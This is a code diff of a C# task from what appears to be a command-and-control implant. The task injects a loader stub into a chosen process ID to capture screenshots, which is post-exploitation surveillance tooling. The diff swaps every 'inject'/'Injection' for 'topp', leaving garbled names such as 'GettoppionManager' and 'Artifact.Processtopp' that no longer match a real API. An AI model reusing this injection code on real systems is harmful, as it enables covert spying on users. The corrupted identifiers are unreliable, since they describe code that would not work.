@@ -1,10 +1,10 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define SCREENSHOT_INJECT
+#define SCREENSHOT_topp
 #endif
 
-#if SCREENSHOT_INJECT
+#if SCREENSHOT_topp
 
 using Interop.Classes;
 using Interop.Classes.Core;
@@ -26,10 +26,10 @@ using ST = System.Threading.Tasks;
 
 namespace Tasks
 {
-    public class screenshot_inject : Tasking
+    public class screenshot_topp : Tasking
     {
         [DataContract]
-        internal struct ScreenshotInjectParameters
+        internal struct ScreenshottoppParameters
         {
             [DataMember(Name = "pipe_name")]
             public string PipeName;
@@ -59,7 +59,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public screenshot_inject(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public screenshot_topp(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _sendAction = (object p) =>
             {
@@ -118,7 +118,7 @@ namespace Tasks
             MythicTaskResponse resp;
             try
             {
-                ScreenshotInjectParameters parameters = _jsonSerializer.Deserialize<ScreenshotInjectParameters>(_data.Parameters);
+                ScreenshottoppParameters parameters = _jsonSerializer.Deserialize<ScreenshottoppParameters>(_data.Parameters);
                 if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
@@ -145,8 +145,8 @@ namespace Tasks
                         if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                 out byte[] exeAsmPic))
                         {
-                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
-                            if (injector.topp())
+                            var toppor = _agent.GettoppionManager().CreateInstance(exeAsmPic, parameters.PID);
+                            if (toppor.topp())
                             {
                                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                     "",
@@ -154,8 +154,8 @@ namespace Tasks
                                     "",
                                     new IMythicMessage[]
                                     {
-                                        Artifact.ProcessInject(parameters.PID,
-                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                                        Artifact.Processtopp(parameters.PID,
+                                            _agent.GettoppionManager().GetCurrentTechnique().Name)
                                     }));
                                 int count = 1;
                                 int interval = 0;
